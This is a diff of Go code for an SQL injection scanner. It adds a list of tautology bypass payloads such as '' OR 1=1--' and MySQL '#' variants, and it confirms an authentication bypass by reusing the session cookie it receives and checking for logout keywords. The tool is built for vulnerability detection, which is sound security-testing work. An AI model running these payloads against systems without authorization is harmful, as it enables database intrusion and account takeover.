@@ -258,37 +258,45 @@ func (s *SQLiScanner) testContentBased(req crawler.ParameterizedRequest, client 
 	}
 	originalLength := len(originalBody)
 
-	// 2. Inject payload and get modified response
-	// This payload is a classic for bypassing WHERE clause filters.
-	payload := "' OR 1=1--"
-	testParams := copyParams(originalParams)
-	originalValue := testParams.Get(paramName)
-	testParams.Set(paramName, originalValue+payload)
-
-	_, modifiedBody, err := sendRequest(req, client, log, testParams)
-	if err != nil {
-		return scanner.VulnerabilityResult{}, false
+	// 2. Inject various bypass payloads and check for content length changes.
+	bypassPayloads := []string{
+		"' OR 1=1--",        // Generic
+		"' OR '1'='1'--",    // Alternative generic
+		" OR 1=1--",         // No leading quote
+		"') OR 1=1--",       // With closing parenthesis
+		" OR 1=1#",          // MySQL comment
+		"' OR 1=1#",         // MySQL comment
 	}
-	modifiedLength := len(modifiedBody)
 
-	// 3. Compare lengths. A significantly larger response suggests more data was returned.
-	// We use a threshold (e.g., 10% larger) to avoid minor dynamic content changes causing false positives.
-	if modifiedLength > originalLength && float64(modifiedLength) > float64(originalLength)*1.1 {
-		log.Success("SQLi (Content-Based): Detected significant content length increase for param '%s'", paramName)
-		testURL, _, _ := buildRequestComponents(req, testParams)
-		vuln := scanner.VulnerabilityResult{
-			VulnerabilityType: "SQL Injection (Content-Based)",
-			URL:               testURL,
-			Parameter:         paramName,
-			Payload:           payload,
-			Details:           fmt.Sprintf("The response length increased significantly (from %d to %d bytes) after injecting a bypass payload, suggesting the query returned additional data.", originalLength, modifiedLength),
-			Severity:          "High",
-			Evidence:          fmt.Sprintf("Original Length: %d, Injected Length: %d", originalLength, modifiedLength),
-			Location:          getParamLocation(req),
-			Remediation:       "Use parameterized queries (prepared statements).",
-			ScannerName:       s.Name(),
+	for _, payload := range bypassPayloads {
+		testParams := copyParams(originalParams)
+		originalValue := testParams.Get(paramName)
+		testParams.Set(paramName, originalValue+payload)
+
+		_, modifiedBody, err := sendRequest(req, client, log, testParams)
+		if err != nil {
+			continue // Try next payload
 		}
-		return vuln, true
+		modifiedLength := len(modifiedBody)
+
+		// 3. Compare lengths. A significantly larger response suggests more data was returned.
+		if modifiedLength > originalLength && float64(modifiedLength) > float64(originalLength)*1.1 {
+			log.Success("SQLi (Content-Based): Detected significant content length increase for param '%s'", paramName)
+			testURL, _, _ := buildRequestComponents(req, testParams)
+			vuln := scanner.VulnerabilityResult{
+				VulnerabilityType: "SQL Injection (Content-Based)",
+				URL:               testURL,
+				Parameter:         paramName,
+				Payload:           payload,
+				Details:           fmt.Sprintf("The response length increased significantly (from %d to %d bytes) after injecting a bypass payload, suggesting the query returned additional data.", originalLength, modifiedLength),
+				Severity:          "High",
+				Evidence:          fmt.Sprintf("Original Length: %d, Injected Length: %d", originalLength, modifiedLength),
+				Location:          getParamLocation(req),
+				Remediation:       "Use parameterized queries (prepared statements).",
+				ScannerName:       s.Name(),
+			}
+			return vuln, true
+		}
 	}
 
 	return scanner.VulnerabilityResult{}, false
@@ -352,22 +360,48 @@ func (s *SQLiScanner) testAuthBypass(req crawler.ParameterizedRequest, client *h
 		}
 		defer resp.Body.Close()
 
-		// Check for redirect (strong indicator)
+		// Check for redirect (strong indicator) and then verify the session.
 		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
-			location, _ := resp.Location()
-			log.Success("SQLi (Auth Bypass): Detected a redirect to %s for param '%s'", location, paramName)
-			return scanner.VulnerabilityResult{
-				VulnerabilityType: "SQL Injection (Auth Bypass)",
-				URL:               req.URL,
-				Parameter:         paramName,
-				Payload:           payload,
-				Details:           fmt.Sprintf("The application redirected to another page (%s) after injecting a login bypass payload, indicating a successful authentication bypass.", location),
-				Severity:          "High",
-				Evidence:          fmt.Sprintf("Redirect Location: %s", location),
-				Location:          getParamLocation(req),
-				Remediation:       "Use parameterized queries for all database interactions.",
-				ScannerName:       s.Name(),
-			}, true
+			locationURL, err := resp.Location()
+			if err != nil {
+				continue // Can't get location, can't verify.
+			}
+
+			// Capture the new session cookie from the redirect response.
+			sessionCookies := resp.Cookies()
+			if len(sessionCookies) == 0 {
+				continue // No cookie, can't verify session.
+			}
+
+			// Make a follow-up request to the redirected location using the new cookie.
+			finalResp, err := client.GetWithCookies(locationURL.String(), sessionCookies)
+			if err != nil {
+				continue
+			}
+			defer finalResp.Body.Close()
+
+			finalBodyBytes, _ := io.ReadAll(finalResp.Body)
+			finalBodyStr := string(finalBodyBytes)
+
+			// Now, check the final page for a success keyword. This confirms the session is valid.
+			successKeywords := []string{"logout", "my account", "log out", "sign out"}
+			for _, keyword := range successKeywords {
+				if strings.Contains(strings.ToLower(finalBodyStr), keyword) {
+					log.Success("SQLi (Auth Bypass): Successfully verified session hijack after redirect for param '%s'", paramName)
+					return scanner.VulnerabilityResult{
+						VulnerabilityType: "SQL Injection (Auth Bypass)",
+						URL:               req.URL,
+						Parameter:         paramName,
+						Payload:           payload,
+						Details:           fmt.Sprintf("The application redirected to %s and a valid session was established after injecting a login bypass payload. The final page contained the keyword '%s'.", locationURL.String(), keyword),
+						Severity:          "High",
+						Evidence:          fmt.Sprintf("Redirect Location: %s, Session Cookie: %s", locationURL.String(), sessionCookies[0].Name),
+						Location:          getParamLocation(req),
+						Remediation:       "Use parameterized queries for all database interactions.",
+						ScannerName:       s.Name(),
+					}, true
+				}
+			}
 		}
 
 		// Check for content change AND success keyword (robust check)
